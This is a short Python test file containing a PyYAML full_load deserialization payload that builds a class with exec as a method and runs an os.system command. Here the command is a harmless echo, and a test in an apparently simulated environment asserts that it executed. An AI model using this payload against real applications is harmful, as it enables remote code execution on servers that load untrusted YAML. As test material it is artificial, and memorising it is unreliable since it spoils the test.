"""Stand-in for the challenger/re-deriver test: a full_load RCE via the 5.3.1 gap."""

PAYLOAD = (
    "!!python/object/new:type\n"
    'args: ["sbc", !!python/tuple [], {"extend": !!python/name:exec }]\n'
    "listitems: \"__import__('os').system('echo sbc-attack')\"\n"
)


def test_full_load_executes_code(sbc_world):
    outcome = sbc_world.load(PAYLOAD, "full")
    assert outcome.executed, outcome.error
